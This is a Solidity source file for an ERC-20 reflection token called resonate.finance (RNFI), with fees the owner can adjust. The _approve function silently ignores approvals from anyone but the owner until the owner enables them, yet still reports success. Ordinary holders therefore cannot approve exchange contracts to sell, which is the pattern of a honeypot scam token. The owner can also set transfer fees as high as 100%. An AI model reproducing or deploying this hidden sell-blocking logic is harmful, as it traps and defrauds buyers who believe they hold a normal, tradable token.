/*
 * Copyright © 2020 resonate.finance. ALL RIGHTS RESERVED.
 */

pragma solidity ^0.7.0;

import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/GSN/Context.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/utils/Address.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/access/Ownable.sol";

contract RESONATE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

   
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcluded; 
    address[] private _excluded;    

    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 10**6 * 10**9; 
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "resonate.finance";
    string private _symbol = "RNFI"; 
    uint8 private _decimals = 9;
    uint256 private _decimals_exponent = 10 ** _decimals;
    bool private _approveAllowed = false;
    uint256 private _max_fee_ratio = 0;
    uint256 private _min_fee_ratio = 0;
    uint256 private _upper_bound_amount = 1800;
    uint256 private _lower_bound_amount = 0;
    

    constructor() public {
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public override view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public override view returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        override
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function isExcluded(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function reflect(uint256 tAmount) public {
        address sender = _msgSender();
        require(
            !_isExcluded[sender],
            "Excluded addresses cannot call this function"
        );
        (uint256 rAmount, , , , ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rTotal = _rTotal.sub(rAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferFee)
        public
        view
        returns (uint256)
    {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount, , , , ) = _getValues(tAmount);
            return rAmount;
        } else {
            (, uint256 rTransferAmount, , , ) = _getValues(tAmount);
            return rTransferAmount;
        }
    }

    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function excludeAccount(address account) external onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if (_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeAccount(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is already not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

    function allowApprove() external onlyOwner() {
        _approveAllowed = true;
    }

    function getAllowApprove() public view returns (bool) {
        return _approveAllowed;
    }
    
    function setMinFeeRatio(uint256 ratio) external onlyOwner() {
        require(ratio >= 0 && ratio <= 10000, "fee ratio is out of range");
        require(ratio <= _max_fee_ratio, "_min_fee_ratio cannot exceed _max_fee_ratio");
        _min_fee_ratio = ratio;
    }
    
    function setMaxFeeRatio(uint256 ratio) external onlyOwner() {
        require(ratio >= 0 && ratio <= 10000, "fee ratio is out of range");
        require(_min_fee_ratio <= ratio, "_max_fee_ratio cannot be smaller than _min_fee_ratio");
        _max_fee_ratio = ratio;
    }
    
    function setFeeRatio(uint256 min_ratio, uint256 max_ratio) external onlyOwner() {
        require(min_ratio >= 0 && min_ratio <= 10000, "fee ratio is out of range");
        require(max_ratio >= 0 && max_ratio <= 10000, "fee ratio is out of range");
        require(min_ratio <= max_ratio, "min_ratio cannot exceed max_ratio");
        _max_fee_ratio = max_ratio;
        _min_fee_ratio = min_ratio;
    }   
    
    function setUpperBoundAmount(uint256 amount) external onlyOwner() {
        require(amount >= 0 && amount <= (_tTotal/_decimals_exponent), "amount is out of range");
        require(amount >= _lower_bound_amount, "_upper_bound_amount cannot be smaller than _lower_bound_amount");
        _upper_bound_amount = amount;
    }    
    
     function setLowerBoundAmount(uint256 amount) external onlyOwner() {
        require(amount >= 0 && amount <= (_tTotal/_decimals_exponent), "amount is out of range");
        require(_upper_bound_amount >= amount, "_lower_bound_amount cannot be bigger than _lower_bound_amount");
        _lower_bound_amount = amount;
    }     
    
     function setLowerBoundAndUpperBoundAmount(uint256 lower_bound_amount, uint256 upper_bound_amount) external onlyOwner() {
        require(lower_bound_amount >= 0 && lower_bound_amount <= (_tTotal.div(_decimals_exponent)), "amount is out of range");
        require(upper_bound_amount >= 0 && upper_bound_amount <= (_tTotal.div(_decimals_exponent)), "amount is out of range");
        
        require(upper_bound_amount >= lower_bound_amount, "lower_bound_amount cannot be bigger than upper_bound_amount");
        _lower_bound_amount = lower_bound_amount;
        _upper_bound_amount = upper_bound_amount;
    }         
    
    function getMinFeeRatio() public view returns (uint256) {
        return _min_fee_ratio;
    }    
    
    function getMaxFeeRatio() public view returns (uint256) {
        return _max_fee_ratio;
    }

    function getUpperBoundAmount() public view returns (uint256) {
        return _upper_bound_amount;
    }    
    
    function getLowerBoundAmount() public view returns (uint256) {
        return _lower_bound_amount;
    }    
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        if(_approveAllowed || Ownable.owner() == owner)
        {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferToExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferStandard(sender, recipient, amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothExcluded(sender, recipient, amount);
        } else {
            _transferStandard(sender, recipient, amount);
        }
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferToExcluded(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferFromExcluded(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee
        ) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferBothExcluded(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee
        ) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(
            tAmount,
            tFee,
            currentRate
        );
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
    }

    function _getTValues(uint256 tAmount)
        private
        view
        returns (uint256, uint256)
    {
        uint256 fee_ratio = 0;
        if(tAmount <= _lower_bound_amount.mul(_decimals_exponent))
        {
            fee_ratio = _min_fee_ratio;
        }
        else if(tAmount >= _upper_bound_amount.mul(_decimals_exponent))
        {
            fee_ratio = _max_fee_ratio;
        }
        else
        {
            uint256 diff_amount = tAmount.sub(_lower_bound_amount.mul(_decimals_exponent));
            uint256 max_diff_amount = _upper_bound_amount.sub(_lower_bound_amount);
            max_diff_amount = max_diff_amount.mul(_decimals_exponent);
            uint256 max_diff_ratio = _max_fee_ratio.sub(_min_fee_ratio);
            uint256 fraction = diff_amount.mul(max_diff_ratio).div(max_diff_amount);
            fee_ratio = fraction.add(_min_fee_ratio);
        }
        
        uint256 tFee = tAmount.div(10000).mul(fee_ratio);
        uint256 tTransferAmount = tAmount.sub(tFee);
        return (tTransferAmount, tFee);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (
                _rOwned[_excluded[i]] > rSupply ||
                _tOwned[_excluded[i]] > tSupply
            ) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
}
